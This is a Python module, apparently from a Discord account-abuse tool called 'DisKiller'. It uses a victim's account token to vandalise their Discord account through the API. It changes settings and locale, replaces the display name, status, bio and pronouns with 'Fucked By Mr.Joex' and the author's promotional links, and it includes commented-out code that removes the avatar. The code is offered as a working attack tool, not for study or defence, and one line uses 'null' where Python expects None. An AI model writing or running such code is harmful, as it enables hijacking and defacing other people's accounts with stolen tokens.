import random
import requests
import time
from data.common import *

def fuckAccount(token):
    set_console_title("DisKiller | Insta: 0xmrjoex | Fuck Account")
    
    # Change user settings
    setting = {
        'theme': 'light',
        'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
        'custom_status': {
            'text': 'Fucked By Mr.Joex',
            'emoji_name': '⏱️'
        },
        'render_embeds': False,
        'render_reactions': False
    }
    response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=getheaders(token), json=setting)
    if response.status_code == 200:
        print(f"{rr}[ {w}+ {rr}]{w} Fucked their settings")
    else:
        print(f"{Fore.WHITE}[ {Fore.RED}X {Fore.WHITE}] Failed to fuck settings")
        
    # Change display name, pronouns, and bio
    profile_data = {
        'global_name': 'Fucked By Mr.Joex',
        'bio': 'Fucked by Mr.Joex Tools\nServer for tool: https://discord.gg/c4JWxUPy\ninsta:\nhttps://instagram.com/0xmrjoex\nhttps://youtube.com/@0xmrjoex\n',
        'pronouns': 'https://guns.lol/0xmrjoex',
        'avatar': null
    }
    response = requests.patch("https://discord.com/api/v9/users/@me/profile", headers=getheaders(token), json=profile_data)
    if response.status_code == 200:
        print(f"{rr}[ {w}+ {rr}]{w} Updated profile details")
    else:
        print(f"{Fore.WHITE}[ {Fore.RED}X {Fore.WHITE}] Failed to update profile details")
    # remove_avatar_data = {
        # 'avatar': None
    # }
    # response = requests.patch("https://discord.com/api/v9/users/@me", headers=getheaders(token), json=remove_avatar_data)
    # if response.status_code == 200:
        # print(f"{rr}[ {w}+ {rr}]{w} Removed profile picture")
    # else:
        # print(f"{Fore.WHITE}[ {Fore.RED}X {Fore.WHITE}] Failed to remove profile picture")

    time.sleep(2)
